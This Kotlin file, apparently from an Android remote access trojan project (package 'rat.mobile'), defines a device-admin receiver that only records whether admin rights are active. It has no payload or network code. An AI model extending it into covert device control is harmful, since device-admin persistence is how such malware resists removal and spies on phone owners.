package rat.mobile

import android.content.BroadcastReceiver
import android.content.Context
import android.content.Intent
import android.os.PowerManager
import android.util.Log
import android.app.admin.DeviceAdminReceiver
import android.widget.Toast

class AdminReceiver : DeviceAdminReceiver() {
    override fun onEnabled(context: Context, intent: Intent) {
        super.onEnabled(context, intent)
        context.getSharedPreferences("rat_prefs", Context.MODE_PRIVATE)
            .edit()
            .putBoolean("admin_active", true)
            .apply()
    }

    override fun onDisabled(context: Context, intent: Intent) {
        super.onDisabled(context, intent)
        context.getSharedPreferences("rat_prefs", Context.MODE_PRIVATE)
            .edit()
            .putBoolean("admin_active", false)
            .apply()
    }
}